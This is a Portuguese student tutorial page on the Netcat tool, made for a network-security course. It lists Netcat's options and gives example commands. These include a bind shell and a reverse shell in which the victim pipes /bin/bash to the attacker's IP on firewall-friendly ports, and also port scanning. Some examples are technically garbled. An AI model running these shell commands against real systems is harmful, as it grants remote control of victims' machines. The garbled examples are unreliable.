<!DOCTYPE html>
<html lang="en-us">
   <head>
      <meta charset="UTF-8">
      <title>NetCat Tool by renanoaraujo</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="stylesheet" type="text/css" href="stylesheets/normalize.css" media="screen">
      <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
      <link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="screen">
      <link rel="stylesheet" type="text/css" href="stylesheets/github-light.css" media="screen">        
   </head>

   <body>
      <section class="page-header">
         <h1 class="project-name">NetCat Tool</h1>
         <h2 class="project-tagline">Tutorial</h2>
      </section>

      <section class="main-content">
      
      <h3>
         <a id="welcome-to-github-pages" class="anchor" href="#welcome-to-github-pages" aria-hidden="true"><span class="octicon octicon-link"></span></a>Apresentação</h3>

         <p>
            Este site tem como objetivo apresentar a ferramenta NetCat para a disciplina de Segurança de Redes do curso de Ciência da Computação.
            <br />
            O site vai simplificar o uso da ferramenta com alguns exemplos e imagens para melhor entendimento.
            <br />
            <br />

            Universidade Católica de Pernambuco
            <br />
            Nome do Aluno: Renan Oliveira de Araújo
            <br />
            Professor: Rubens
         </p>

      <h3>

         <a id="designer-templates" class="anchor" href="#designer-templates" aria-hidden="true">
            <span class="octicon octicon-link"></span></a>A ferramenta NetCat (NC)

      </h3>

      <p>
         
         O Netcat é uma ferramenta usada para ler e escrever dados em conexões de rede usando o protocolo TCP/IP. Dada sua grande versatilidade, o Netcat é considerado pelos hackers o canivete suíço do TCP/IP
         <br />
         <br />
         O nome netcat vem do comando "cat" do Linux. O cat concatena arquivos e envia para a saída padrão (stdout). O netcat faz praticamente o mesmo, porém ao invés de concatenar arquivos, o netcat concatena sockets TCP e UDP.
         <br />
         <br />
         Netcat é um serviço de rede de computador para leitura e gravação para conexões de rede usando TCP. Netcat é projetado para ser um confiável back-end que pode ser usada diretamente ou facilmente conduzido por outros programas e scripts. Ao mesmo tempo, é uma ferramenta de depuração de rede e investigação rico em recursos, uma vez que pode produzir quase qualquer tipo de conexão de seus usuários pode precisar e tem uma série de recursos internos.

      </p>

      <h3>
      <a id="creating-pages-manually" class="anchor" href="#creating-pages-manually" aria-hidden="true"><span class="octicon octicon-link"></span></a>Algumas utilidades</h3>

      <p>
         <lu>
            <li>Conexões de saída ou de entrada, TCP ou UDP, para ou de quaisquer portas</li>
            <li>Completa DNS para a frente / ré verificar, com as devidas advertências</li>
            <li>Capacidade de usar qualquer porta fonte local</li>
            <li>Capacidade de usar qualquer endereço de origem de rede configurados localmente</li>
            <li>Built-in capacidades de varredura de portas, com randomização</li>
            <li>Built-in capacidade de roteamento de origem solto</li>
            <li>Pode ler argumentos de linha de comando da entrada padrão</li>
            <li>Slow-enviar de modo, uma linha de cada N segundos</li>
            <li>Hexadecimal dos dados transmitidos e recebidos</li>
            <li>Capacidade opcional de deixar um outro serviço de programas estabelecer conexões</li>
            <li>Opcional telnet -options responder</li>
            <li>Destaque tunelamento modo que permite tunneling definida pelo usuário, por exemplo, UDP ou TCP, com a possibilidade de especificar todos os parâmetros de rede (porta de origem / interface, porta de escuta / interface, eo host remoto permissão para se conectar ao túnel).</li>
         </lu>

      </p>

      <h3>
      <a id="authors-and-contributors" class="anchor" href="#authors-and-contributors" aria-hidden="true"><span class="octicon octicon-link"></span></a>Funções</h3>

      <p>
         <lu>
            <li>-c comandos: Esta opção é parecida com a -e abaixo. Ela vai executar o comando especificado quando a conexão for efetuada.</li>
            <li>-e arquivo: Executa o arquivo especificado quando a conexão for estabelecida.</li>
            <li>-g: Define uma cadeia de até 8 gateways por onde o pacote deve passar antes de chegar ao destino.</li>
            <li>-i segundos: Define um intervalo em segundos para aguardar entre as linhas enviadas ou portas scaneadas.</li>
            <li>-k: Ativa o keepalive para que uma conexão não seja encerrada se ficar inativa por muito tempo.</li>
            <li>-l: Inicia um socket em modo de escuta, esperando por conexões de clientes.</li>
            <li>-n: Não resolve nomes DNS.</li>
            <li>-o arquivo: Salva um dump em formato hexadecimal do tráfego. O resultado final fica bem parecido com quando se usa o TCPDump e a opção -X</li>
            <li>-p porta: Define a porta onde o socket irá esperar conexões de clientes.</li>
            <li>-r: Define portas aleatórias tanto localmente quanto remotamente.</li>
            <li>-q segundos: Finaliza o socket depois de X segundos de inatividade.</li>
            <li>-s IP: Define qual será o endereço IP de origem utilizado.</li>
            <li>-u: Funciona em modo UDP. O padrão (sem especificar opção alguma) é TCP.</li>
            <li>-v: Aumenta a quantidade de mensagens informativas mostradas pelo comando. Use duas vezes para mais output (-vv).</li>
            <li>-w segundos: Timeout para conexões.</li>
            <li>-z: Não envia nada pelo socket, apenas verifica se consegue ou não se conectar à porta de destino. Usada quando se vai fazer um scan.</li>
         </lu>

      </p>










<h3>

         <a id="designer-templates" class="anchor" href="#designer-templates" aria-hidden="true">
            <span class="octicon octicon-link"></span></a>Obtendo o canivete-suíço

      </h3>

      <p>
         
         A maioria das distribuições Linux já vem com o netcat instalado, outras vem com ele pré-instalado. Caso sua distribuição ainda não tenha o netcat, você pode obtê-lo em <a href="www.securityfocus.com">www.securityfocus.com</a> e <a href="www.packetstormsecurity.net">www.packetstormsecurity.net</a>
<br />
<br />
Para chamar o programa, basta o simples comando: 
<br />
<br />
<b>$nc</b> 

      </p>










      <h3>

         <a id="designer-templates" class="anchor" href="#designer-templates" aria-hidden="true">
            <span class="octicon octicon-link"></span></a>Como o Netcat funciona

      </h3>

      <p>
         
         A princípio o Netcat foi lançado para ser um telnet aprimorado. Até então a única utilidade que ele teria seria se conectar a um host.
         <br />
         <br />
         Porém, como o netcat pega os dados da entrada padrão (stdin) e envia pra outra ponta da conexão, que as escreve na saída padrão (stdout), é possível utilizar ele em conjunto com o shell pra fazer inúmeras coisas.

         <br />
         <br />
         O Netcat é chamado com o comando "nc", você pode tanto dar as sintaxes depois do nc, quanto na linha "CMD LINE" que aparece após o comando "nc" simples. 
         <br />
         <br />
         Para listar as sintaxes disponíveis no Netcat, digite: 
         <br />
         <br />
         <b>$ nc -h</b>
         <br />
         <br />
         A tela ficará mais ou menos assim: 
         <br />
         <br />
         <img src="img01.png" width="400">
      </p>














<h3>

         <a id="designer-templates" class="anchor" href="#designer-templates" aria-hidden="true">
            <span class="octicon octicon-link"></span></a>Alguns experimentos

      </h3>

      <p>
         
         


<h4>1) CONECTANDO-SE A UM HOST</h4>



<p>É feita da mesma maneira que o telnet. É especificado apenas um host e a porta a se conectar. Exemplos: </p>

<p><b>$nc mail.yahoo.com.br 110</b><br>
<b>$nc www.terra.com.br 80</b> <br>


<p>Lembrando que a porta 110 é dos servidores de POP3 e a 80 é para web. 
</p>
<h4>2) ABRINDO UMA PORTA (LISTENNING)</h4>


<p>É utilizada a sintaxe -l para colocar em listenning e -vv para retornar eco com detalhes. A seguir é estipulada a porta: </p>

</p><b>$nc -l -p 53 -vv </b></p>

<p>Será retornada uma mensagem: </p>

<p><b>"listenning on [any] 53 ... " </b></p>


<h4>3) ESCANEANDO PORTAS COM O NETCAT</h4>


<p>Será feita uma tentativa de conexão à um IP ou host e será estipulada as portas da tentativa de conexão: </p>

<p><b>$nc -vv www.vivaolinux.com.br 110 80 139</b></p>
<p><b>$nc -vv www.vivaolinux.com.br 1-10000 </b></p>

<p>No primeiro exemplo serão escaneadas apenas as portas 110 (POP3), 80 (web) e 139 (compartilhamento do Windows). </p>

<p>Já no segundo exemplo serão escaneadas desde a porta 1 até a 10000. </p>

<h4>4) ABRINDO A PORTA, DANDO ENTRADA PARA UM "SHELL" (=TROJAN)</h4>


<p>Será colocada a porta X em listenning, redirecionaremos a saída de dados para um shell (/bin/bash). Assim quando alguém se conectar a essa porta terá domínio total sobre o computador. Funciona de forma semelhante a um trojan.</p>

<p><b>$nc -l -e /bin/bash -p 1033 </b></p>

<h4>5) REALIZANDO UM BRUTE-FORCE</h4>

<p><b>$nc -vv 79 < ~/wordlists.txt > bruteforce.log </b></p>

<p>Perceba, que conectaremos a porta do FINGER(79) e redirecionaremos o conteúdo do arquivo wordlists.txt para essa porta. Quando algum resultado for válido ele será salvo em bruteforce.log para uma análise posterior dos resultados. </p>

<h4>6) FAZENDO UM SNIFFER</h4>


<p>Além de tudo isto demonstrado acima, o 'amazing' Netcat ainda pode capturar todo o tráfego de uma rede. Eu acho que você já sabe como fazer isso se observar os redirecionamentos utilizados no exemplo anterior. Mas vamos lá. </p>

<p>Iremos nos conectar a uma porta e mandar o netcat "dar eco" nela, ou seja, exibir TUDO o que passa por ela. Após isso, é só redirecionar tudo o que o Netcat gravou para um arquivo. Veja a sintaxe, para melhor compreensão: </p>

<p><b>$nc -vv -L 127.0.0.1 -p 80 > ~/sniffer.log </b></p>




      </p>














<h3>

         <a id="designer-templates" class="anchor" href="#designer-templates" aria-hidden="true">
            <span class="octicon octicon-link"></span></a>Fazendo uma conexão reversa com o NetCat

      </h3>

      <p>
         
         A conexão reversa é um método de invasão parecida com os trojans, porém ocorre de maneira contrária, ou seja, não será o invasor que se conectará ao host, mas o host se conectará ao invasor, concedendo-lhe poderes administrativos. O mais surpreendente é que utilizando a imaginação, podemos fazer isso com o Netcat.
         <br>
         <br>
         Sabendo disso, vamos tomar um IP fictício de exemplo = 200.212.21.2. O que teremos que fazer é abrir uma porta em nosso computador local e fazer, executando um código arbitrário no computador da vítima, com que ela se conecte ao nosso computador e nos conceda poderes em sua máquina. Vamos no modo gráfico e abriremos duas janelas, abrindo as portas 53 e 79: 
<br>
<br>
         <b>$nc -l -n -p 53 -vv</b><br>
<b>$nc -l -n -p 79 -vv </b>





<br>
<br>


<p>Após isso, faremos com que a vítima execute o seguinte código no computador dela: </p>

<p><b>$nc < NOSSOIP > 53 | /bin/bash | nc < NOSSOIP > 79 </b></p>


<p>Isso fará com que os comandos que nós dermos na porta 53, passem pelo shell bash e a resposta seja redirecionada na porta 79. </p>

<p>Lembrando que as portas 53 e 79 foram utilizadas, pois o firewall deixa essas portas abrirem, pois são de consultas DNS e FINGER respectivamente. </p>
      </p>














      <footer class="site-footer">
      <span class="site-footer-owner"><a href="https://github.com/renanoaraujo/netcattool">Netcat Tool</a> is maintained by <a href="https://github.com/renanoaraujo">renanoaraujo</a>.</span>

      <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the <a href="https://github.com/jasonlong/cayman-theme">Cayman theme</a> by <a href="https://twitter.com/jasonlong">Jason Long</a>.</span>
      </footer>

      </section>


   </body>
</html>
